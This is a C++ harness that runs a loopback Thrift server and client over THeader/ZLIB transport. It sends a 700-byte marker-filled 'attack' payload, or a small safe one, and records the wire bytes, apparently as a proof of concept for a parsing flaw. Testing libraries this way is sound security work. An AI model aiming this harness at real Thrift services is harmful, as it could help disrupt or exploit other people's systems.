// Live THeader/ZLIB server + client against real Thrift 0.23.0 bytes.
// Loopback only. Server: ./live server PORT ; Client: ./live client PORT
#include <thrift/TProcessor.h>
#include <thrift/protocol/TBinaryProtocol.h>
#include <thrift/protocol/TProtocolTypes.h>
#include <thrift/server/TSimpleServer.h>
#include <thrift/transport/THeaderTransport.h>
#include <thrift/transport/TServerSocket.h>
#include <thrift/transport/TSocket.h>

#include <cstdint>
#include <cstdlib>
#include <iostream>
#include <memory>
#include <string>
#include <fstream>
#include <vector>

using namespace apache::thrift;
using namespace apache::thrift::protocol;
using namespace apache::thrift::server;
using namespace apache::thrift::transport;

class ReadOnceProcessor : public TProcessor {
 public:
  bool process(std::shared_ptr<TProtocol> in, std::shared_ptr<TProtocol> out,
               void* /*connectionContext*/) override {
    std::string name;
    TMessageType type;
    int32_t seqid = 0;
    in->readMessageBegin(name, type, seqid);
    std::cout << "PROCESS_REACHED name=" << name << " seqid=" << seqid << std::endl;
    return true;
  }
};

class TapTransport : public TTransport {
 public:
  explicit TapTransport(std::shared_ptr<TTransport> inner) : inner_(std::move(inner)) {}
  bool isOpen() const override { return inner_->isOpen(); }
  void open() override { inner_->open(); }
  void close() override { inner_->close(); }
  uint32_t read_virt(uint8_t* buf, uint32_t len) override { return inner_->read(buf, len); }
  void write_virt(const uint8_t* buf, uint32_t len) override {
    bytes_.insert(bytes_.end(), buf, buf + len);
    inner_->write(buf, len);
  }
  void flush() override { inner_->flush(); }
  const std::vector<uint8_t>& bytes() const { return bytes_; }

 private:
  std::shared_ptr<TTransport> inner_;
  std::vector<uint8_t> bytes_;
};

static std::string attackPayload() {
  std::string s(700, 0x42);
  const char markers[] = {0x41, 0x5a, 0x7a, 0x3c, 0x7b, 0x42, 0x7b};
  const size_t offsets[] = {0, 16, 32, 64, 128, 256, 699};
  for (size_t i = 0; i < sizeof(offsets) / sizeof(offsets[0]); ++i) {
    s[offsets[i]] = markers[i];
  }
  return s;
}

int main(int argc, char** argv) {
  if (argc != 3) {
    std::cerr << "usage: live server|client PORT" << std::endl;
    return 2;
  }
  const std::string mode = argv[1];
  const int port = std::atoi(argv[2]);
  try {
    if (mode == "server") {
      auto serverTransport = std::make_shared<TServerSocket>("127.0.0.1", port);
      auto transportFactory = std::make_shared<THeaderTransportFactory>();
      auto protocolFactory = std::make_shared<TBinaryProtocolFactory>();
      TSimpleServer server(std::make_shared<ReadOnceProcessor>(), serverTransport,
                           transportFactory, protocolFactory);
      std::cout << "LISTENING 127.0.0.1:" << port << std::endl;
      server.serve();
      return 0;
    }
    if (mode == "client" || mode == "client-safe") {
      auto sock = std::make_shared<TSocket>("127.0.0.1", port);
      sock->open();
      auto tap = std::make_shared<TapTransport>(sock);
      auto trans = std::make_shared<THeaderTransport>(tap);
      trans->setProtocolId(T_BINARY_PROTOCOL);
      trans->setTransform(THeaderTransport::ZLIB_TRANSFORM);
      TBinaryProtocol proto(trans);
      const std::string payload = (mode == "client-safe") ? std::string(4, 0x42) : attackPayload();
      proto.writeMessageBegin("attack", T_CALL, 1);
      proto.writeStructBegin("args");
      proto.writeFieldBegin("payload", T_STRING, 1);
      proto.writeString(payload);
      proto.writeFieldEnd();
      proto.writeFieldStop();
      proto.writeStructEnd();
      proto.writeMessageEnd();
      trans->flush();
      const char* wirePath = (mode == "client-safe") ? "wire-safe.bin" : "wire.bin";
      std::ofstream wire(wirePath, std::ios::binary | std::ios::trunc);
      wire.write(reinterpret_cast<const char*>(tap->bytes().data()),
                 static_cast<std::streamsize>(tap->bytes().size()));
      std::cout << "SENT uncompressed_payload=" << payload.size()
                << " transform=ZLIB wire_bytes=" << tap->bytes().size()
                << " file=" << wirePath << std::endl;
      return 0;
    }
  } catch (const std::exception& e) {
    std::cerr << "EXCEPTION " << e.what() << std::endl;
    return 3;
  }
  return 2;
}
